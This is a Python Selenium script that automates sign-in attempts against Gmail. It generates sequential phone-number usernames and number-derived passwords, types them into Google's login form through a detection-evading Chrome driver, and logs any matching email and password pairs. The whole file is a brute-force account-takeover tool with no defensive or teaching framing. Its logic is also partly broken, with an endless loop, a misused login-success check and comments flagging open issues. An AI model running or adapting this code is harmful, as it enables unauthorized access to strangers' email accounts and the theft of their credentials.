from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from time import sleep
import pandas as pd
from datetime import date, datetime
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import random
from src.const import PASSWORD_URL, GMAIL_URL, NEXT_BUTTON, SIGNIN_URL, INBOX_URL


def start_grabbing(self, x_path, number, amount, length_of_password):
    arr = []
    pass_arr = []
    success_email = []
    password_url = PASSWORD_URL
    gmail_url = GMAIL_URL
    wait = WebDriverWait(self, 20)
    email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
    submit_email = wait.until(EC.element_to_be_clickable((
        By.XPATH, "//span[normalize-space()='Next']"
    )))
    email.click()
    i = 1
    k = 1
    while i <= amount:
        i += 1
        number = int(number) + 1
        number_str = "0{}".format(number)
        arr.append(number_str)
        pass_arr.append(str(number)[:length_of_password])
    print("Numbers for bypassing Email => " + str(arr))
    print("Chosen Passwords => " + str(pass_arr))
    sleep(2)
    while True:
        for j in arr:
            email.send_keys(j)
            sleep(2)
            submit_email.click()
            print("Tried : " + str(j))
            password_input = wait.until(EC.presence_of_all_elements_located((
                By.XPATH, "//input[@name='Passwd']"
            )))
            # checking the password input is present or not
            if password_input:
                print("One email worked")
                success_email.append(j)
                print("Success Email" + str(j))
            # pass password from here
            for z in pass_arr:
                password = wait.until(EC.element_to_be_clickable((
                    By.XPATH, "//input[@name='Passwd']"
                )))
                password.click()
                password.send_keys(z)
                sleep(3)
                next_button = wait.until(EC.element_to_be_clickable((
                    By.XPATH, NEXT_BUTTON
                )))
                next_button.click()
                # issue
                if wait.until(EC.invisibility_of_element_located((By.XPATH, INBOX_URL))):
                    print("Email Matched: " + str(j) + " Matched Password:" + str(z))
                    # issue here
                    self.convert_to_dataframe(j, z)
                    self.get(SIGNIN_URL)
                    continue
                else:
                    continue
            sleep(2)
            # email.clear()
            # break
    print("Numbers logs = > ", arr)
    print("Testing all the numbers....")
    print("Tried => ", len(arr), "times")
    self.quit()